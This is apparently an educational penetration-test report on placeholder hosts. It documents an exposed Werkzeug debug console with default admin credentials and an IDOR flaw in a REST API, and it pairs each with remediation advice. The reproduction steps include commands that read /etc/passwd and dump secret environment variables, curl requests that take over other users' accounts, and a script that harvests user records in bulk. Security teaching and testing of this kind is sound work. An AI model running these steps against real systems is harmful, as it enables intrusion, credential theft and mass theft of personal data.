# 🔐 Security Vulnerability — Proof of Concept Reports

![OWASP Top 10](https://img.shields.io/badge/OWASP-Top%2010-red?style=flat-square&logo=owasp)
![CVSSv3](https://img.shields.io/badge/CVSSv3-Critical%20%2F%20High-critical?style=flat-square)
![Status](https://img.shields.io/badge/Status-PoC%20Confirmed-orange?style=flat-square)
![License](https://img.shields.io/badge/Purpose-Educational%20Only-blue?style=flat-square)

> **⚠️ Disclaimer:** This document is for **educational and authorized security research purposes only**. All findings were discovered and tested in a controlled lab environment with explicit permission. Do not use this knowledge against systems you do not own or have written authorization to test.

---

## 📋 Table of Contents

- [Overview](#overview)
- [PoC 1 — Security Misconfiguration](#poc-1--security-misconfiguration-owasp-a052021)
- [PoC 2 — Broken Access Control (IDOR)](#poc-2--broken-access-control-idor-owasp-a012021)
- [CVSS Scoring Summary](#cvss-scoring-summary)
- [Remediation Checklist](#remediation-checklist)
- [References](#references)

---

## Overview

This report documents two critical web application vulnerabilities discovered during a security assessment. Both vulnerabilities fall under the [OWASP Top 10 (2021)](https://owasp.org/Top10/) and represent the most common and impactful classes of web security flaws.

```
Target Scope
├── app.target.example        (Web Application)
│   ├── :8080                 → Debug interface (Misconfiguration)
│   └── /admin                → Admin panel (Default credentials)
└── api.target.example        (REST API)
    └── /api/v1/users/{id}    → IDOR on user resources
```

---

## PoC 1 — Security Misconfiguration (OWASP A05:2021)

![OWASP A05](https://img.shields.io/badge/OWASP-A05%3A2021-red?style=flat-square)
![CVSSv3](https://img.shields.io/badge/CVSSv3-9.8%20Critical-critical?style=flat-square)
![CWE](https://img.shields.io/badge/CWE-CWE--16-red?style=flat-square)
![Vector](https://img.shields.io/badge/Vector-Network%2FNo%20Auth-darkred?style=flat-square)

### 🔍 Description

The application was deployed with the **Werkzeug development debug server** exposed on port `8080` without authentication. This interface provides:

- An interactive Python/REPL console
- Full HTTP request/response traces
- Plaintext environment variable dumps (secrets, API keys, DB URLs)

Additionally, the admin panel at `/admin` retained **factory credentials** (`admin:admin`), granting full application management access.

> These two misconfigurations together enable **unauthenticated Remote Code Execution (RCE)** on the host server.

---

### 🗺️ Attack Flow Diagram

```
Attacker
   │
   ▼
[1] Port scan → Discover port 8080 open (Werkzeug debug server)
   │
   ▼
[2] GET http://app.target.example:8080/?__debugger__=yes
      → No authentication required
      → Interactive Python REPL loaded in browser
   │
   ▼
[3] Execute arbitrary OS commands via REPL
      import subprocess
      subprocess.check_output(['id'])
      → uid=0(root)
   │
   ├──▶ [4a] Read environment variables → Steal secrets
   │         os.environ → DATABASE_URL, SECRET_KEY, AWS_ACCESS_KEY_ID
   │
   └──▶ [4b] Access /admin with default creds admin:admin
               → Full user/data management
```

---

### 🧪 Proof of Concept — Reproduction Steps

#### Step 1 — Discover the Exposed Debug Port

```bash
nmap -p 8080 app.target.example -sV
```

**Output:**
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 2.3.7 (Python 3.11.4)
```

#### Step 2 — Access the Debug Console

Navigate to the following URL in a browser (no authentication required):

```
http://app.target.example:8080/?__debugger__=yes
```

![Werkzeug Debug Console](https://github.com/pallets/werkzeug/raw/main/docs/_static/debugger.png)

> *The Werkzeug interactive debugger — accessible without credentials in a misconfigured production deployment.*

#### Step 3 — Execute Arbitrary System Commands

In the REPL console embedded on the debug page:

```python
import subprocess
result = subprocess.check_output(['id'])
print(result)
# Output: b'uid=0(root) gid=0(root) groups=0(root)'
```

```python
# Read a sensitive system file
open('/etc/passwd').read()
```

#### Step 4 — Dump Environment Variables

```python
import os
print(dict(os.environ))
```

**Sample leaked output:**
```
{
  "DATABASE_URL": "postgresql://admin:S3cret!@db.internal/prod",
  "SECRET_KEY":   "8f42a73054b1749f8f58848be5e6502c",
  "AWS_ACCESS_KEY_ID": "AKIA...",
  "AWS_SECRET_ACCESS_KEY": "wJalrX..."
}
```

#### Step 5 — Access Admin Panel with Default Credentials

```
URL:      http://app.target.example/admin
Username: admin
Password: admin
```

✅ Login succeeded — full admin access granted.

---

### 💥 Impact

| Category | Impact |
|---|---|
| **Confidentiality** | Complete — all secrets, env vars, and user data exposed |
| **Integrity** | Complete — arbitrary file write / code execution |
| **Availability** | Complete — attacker can terminate or destroy application |
| **Scope** | Changed — lateral movement to internal network possible |

---

### 🔒 Remediation

- [ ] **Disable debug mode** in all non-development environments: set `DEBUG=False` and use a production WSGI server (Gunicorn, uWSGI) instead of the built-in Werkzeug server
- [ ] **Firewall port 8080** — never expose debug/admin ports publicly; restrict via VPN or allowlist
- [ ] **Rotate all exposed secrets** immediately (DB password, `SECRET_KEY`, AWS credentials)
- [ ] **Change default admin credentials** — enforce a strong unique password; disable default accounts
- [ ] **Add IP allowlisting** to the admin panel, or move it to an internal-only host
- [ ] **Integrate secret scanning** in CI/CD (`detect-secrets`, `trivy`, `truffleHog`)

---

## PoC 2 — Broken Access Control (IDOR) (OWASP A01:2021)

![OWASP A01](https://img.shields.io/badge/OWASP-A01%3A2021-red?style=flat-square)
![CVSSv3](https://img.shields.io/badge/CVSSv3-8.1%20High-orange?style=flat-square)
![CWE](https://img.shields.io/badge/CWE-CWE--639-orange?style=flat-square)
![Type](https://img.shields.io/badge/Type-IDOR-orange?style=flat-square)

### 🔍 Description

The REST API exposes user resources under **predictable sequential integer IDs**. Access control is enforced only at the authentication layer — the backend does **not** verify that the authenticated user owns the requested resource.

Any valid session token can be used to **read, modify, or delete** data belonging to any other user by simply changing the object ID in the request path.

**Affected endpoints:**
- `GET /api/v1/users/{id}/profile` — Read any user's PII
- `PUT /api/v1/users/{id}/profile` — Modify any user's data (→ account takeover)
- `GET /api/v1/orders/{id}` — Read any user's order + payment info
- `DELETE /api/v1/users/{id}/messages/{msg_id}` — Delete any message

---

### 🗺️ Attack Flow Diagram

```
Attacker (user_id=1098, valid JWT)
   │
   ▼
[1] Normal request (own data):
    GET /api/v1/users/1098/profile
    Authorization: Bearer eyJhbGci...
    → 200 OK — attacker's own data ✓

   │
   ▼
[2] IDOR — change ID to another user's:
    GET /api/v1/users/1042/profile    ← victim's ID
    Authorization: Bearer eyJhbGci...  ← attacker's token
    → 200 OK — victim's full PII returned ✗

   │
   ├──▶ [3a] Account Takeover:
   │         PUT /api/v1/users/1042/profile
   │         {"email": "attacker@test.com"}
   │         → 200 OK — victim's email overwritten
   │         → Password reset flow now hijacked
   │
   ├──▶ [3b] Financial Data Exposure:
   │         GET /api/v1/orders/5513
   │         → Order history + payment card last-4
   │
   └──▶ [3c] Mass Enumeration:
             Loop user IDs 1000–9999
             → Harvest full user database at scale
```

---

### 🧪 Proof of Concept — Reproduction Steps

#### Setup — Two Test Accounts

| Role | Email | User ID |
|---|---|---|
| Attacker | attacker@test.com | 1098 |
| Victim | victim@test.com | 1042 |

#### Step 1 — Authenticate as Attacker

```bash
curl -s -X POST https://api.target.example/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"AttackerPass1!"}' \
  | jq .token
```

**Response:**
```json
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

#### Step 2 — Access Victim's Profile (IDOR Read)

```bash
curl -s https://api.target.example/api/v1/users/1042/profile \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

**Response — HTTP 200 OK:**
```json
{
  "id": 1042,
  "name": "Jane Victim",
  "email": "victim@test.com",
  "phone": "+1-555-0192",
  "address": "123 Main St, Springfield, IL 62701",
  "dob": "1990-04-22"
}
```

> ⚠️ **Full PII of victim returned to attacker's session — no ownership check performed.**

#### Step 3 — Account Takeover via Email Override (IDOR Write)

```bash
curl -s -X PUT https://api.target.example/api/v1/users/1042/profile \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@test.com"}'
```

**Response — HTTP 200 OK:**
```json
{ "updated": true }
```

The attacker can now trigger a **password reset** to `attacker@test.com` and fully take over the victim's account.

#### Step 4 — Read Victim's Order and Payment Data

```bash
curl -s https://api.target.example/api/v1/orders/5513 \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

**Response — HTTP 200 OK:**
```json
{
  "order_id": 5513,
  "user_id": 1042,
  "items": [{"product": "Laptop", "price": 1299.99}],
  "total": 1299.99,
  "payment": {"method": "Visa", "last4": "4242"},
  "shipping_address": "123 Main St, Springfield, IL 62701"
}
```

#### Step 5 — Automated Mass Enumeration

```python
import requests

TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

harvested = []
for user_id in range(1000, 2000):
    r = requests.get(
        f"https://api.target.example/api/v1/users/{user_id}/profile",
        headers=HEADERS
    )
    if r.status_code == 200:
        harvested.append(r.json())
        print(f"[+] user_id={user_id} — {r.json().get('email')}")

print(f"\n[*] Total records harvested: {len(harvested)}")
```

**Sample Output:**
```
[+] user_id=1001 — alice@example.com
[+] user_id=1002 — bob@example.com
[+] user_id=1003 — carol@example.com
...
[*] Total records harvested: 847
```

---

### 💥 Impact

| Category | Impact |
|---|---|
| **Confidentiality** | High — full PII of all users accessible |
| **Integrity** | High — any account's profile and data can be modified |
| **Availability** | Medium — messages and data can be deleted |
| **Regulatory** | Critical — GDPR / CCPA / PCI-DSS mandatory breach disclosure |

---

### 🔒 Remediation

- [ ] **Enforce server-side ownership checks** on every resource endpoint — verify `session.user_id == resource.owner_id` before returning or modifying any object
- [ ] **Build a centralized authorization layer** (e.g. RBAC/ABAC middleware) — do not rely on scattered per-endpoint checks
- [ ] **Replace sequential integer IDs** with non-guessable UUIDs v4 as a defence-in-depth measure (note: this is not a substitute for access control)
- [ ] **Add IDOR regression tests** to the test suite covering read, write, and delete across all resource types
- [ ] **Rate-limit all API endpoints** to prevent automated enumeration attacks
- [ ] **Log and alert** on anomalous access patterns (e.g. one session accessing hundreds of different user IDs in a short window)

---

## CVSS Scoring Summary

| Vulnerability | CVSS Score | Severity | Attack Vector | Privileges | User Interaction |
|---|---|---|---|---|---|
| Security Misconfiguration (Debug + Default Creds) | **9.8** | 🔴 Critical | Network | None | None |
| Broken Access Control — IDOR | **8.1** | 🟠 High | Network | Low | None |

**CVSS v3.1 Vector Strings:**

```
# Security Misconfiguration
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

# Broken Access Control (IDOR)
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
```

---

## Remediation Checklist

### Security Misconfiguration

```
[✓] Disable DEBUG mode in production (DEBUG=False)
[✓] Use production WSGI server (Gunicorn / uWSGI)
[✓] Firewall port 8080 — block all public access
[✓] Rotate all exposed environment secrets
[✓] Change / disable all default admin credentials
[✓] Add IP allowlisting to admin interfaces
[✓] Integrate secret scanning in CI/CD pipeline
```

### Broken Access Control

```
[✓] Server-side ownership check on all resource endpoints
[✓] Centralized RBAC / ABAC authorization middleware
[✓] Replace sequential IDs with UUIDs v4
[✓] IDOR unit + integration tests in regression suite
[✓] Rate limiting on all authenticated API endpoints
[✓] Anomaly detection / alerting on access patterns
```

---

## References

| Resource | Link |
|---|---|
| OWASP Top 10 (2021) | https://owasp.org/Top10/ |
| OWASP A01 — Broken Access Control | https://owasp.org/Top10/A01_2021-Broken_Access_Control/ |
| OWASP A05 — Security Misconfiguration | https://owasp.org/Top10/A05_2021-Security_Misconfiguration/ |
| OWASP IDOR Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html |
| OWASP Access Control Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html |
| CWE-16 — Configuration | https://cwe.mitre.org/data/definitions/16.html |
| CWE-639 — Authorization Through User-Controlled Key | https://cwe.mitre.org/data/definitions/639.html |
| Werkzeug Debug Mode Warning | https://werkzeug.palletsprojects.com/en/latest/serving/#security |
| CVSS v3.1 Calculator | https://www.first.org/cvss/calculator/3.1 |

---

<div align="center">

**Found a bug in this report? Open an issue or submit a PR.**

![Maintained](https://img.shields.io/badge/Maintained-Yes-green?style=flat-square)
![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-brightgreen?style=flat-square)

</div>
